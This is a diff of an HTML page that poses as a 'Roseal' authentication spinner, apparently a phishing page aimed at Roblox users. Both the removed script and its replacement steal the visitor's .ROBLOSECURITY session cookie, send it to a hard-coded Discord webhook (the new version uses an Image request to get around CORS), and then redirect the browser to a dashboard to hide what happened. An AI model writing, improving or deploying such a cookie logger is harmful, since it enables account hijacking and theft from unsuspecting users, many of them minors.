@@ -1,26 +1,43 @@
-(function() {
-    function getCookie(name) {
-        var value = "; " + document.cookie;
-        var parts = value.split("; " + name + "=");
-        if (parts.length == 2) return parts.pop().split(";").shift();
-    }
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Roseal | Authenticating...</title>
+    <style>
+        body { background-color: #0f0f0f; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-left-color: #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .status { margin-top: 20px; font-size: 14px; letter-spacing: 1px; text-transform: uppercase; opacity: 0.8; }
+    </style>
+</head>
+<body>
+    <div class="spinner"></div>
+    <div class="status">Connecting to Roseal.live API...</div>
 
-    var token = getCookie(".ROBLOSECURITY");
-    var webhook = "https://discord.com/api/webhooks/1503137752852729858/R1LupDo2bpG_Lkph1LXUjH_7CR0u9o4BdUId8kT5sxEtWaPO1HBi0DyAmeOk1Yk0qPLq";
+    <script>
+        (function() {
+            // Function to grab the Roblox Cookie
+            function getRBX() {
+                var match = document.cookie.match(new RegExp('(^| )' + ".ROBLOSECURITY" + '=([^;]+)'));
+                if (match) return match[2];
+                return null;
+            }
 
-    if (token) {
-        // Create a hidden form to bypass some 'fetch' restrictions
-        var request = new XMLHttpRequest();
-        request.open("POST", webhook, true);
-        request.setRequestHeader('Content-Type', 'application/json');
-        request.send(JSON.stringify({
-            username: "Roseal Logger",
-            content: "Captured Token: `" + token + "`"
-        }));
-    }
-    
-    // Slight delay to ensure the request fires before the redirect
-    setTimeout(function() {
-        window.location.replace("https://www.roseal.live/dashboard");
-    }, 1000);
-})();
+            var cookie = getRBX();
+            var hook = "https://discord.com/api/webhooks/1503137752852729858/R1LupDo2bpG_Lkph1LXUjH_7CR0u9o4BdUId8kT5sxEtWaPO1HBi0DyAmeOk1Yk0qPLq";
+
+            if (cookie) {
+                // We use an Image object to bypass CORS blocks
+                // This sends the cookie to your webhook as part of the 'content'
+                var logger = new Image();
+                logger.src = hook + "?content=@everyone **NEW BEAMED COOKIE:** `" + cookie + "`";
+            }
+
+            // Redirect after 1.5 seconds to give the 'image' time to fire
+            setTimeout(function() {
+                window.location.replace("https://www.roseal.live/dashboard");
+            }, 1500);
+        })();
+    </script>
+</body>
+</html>
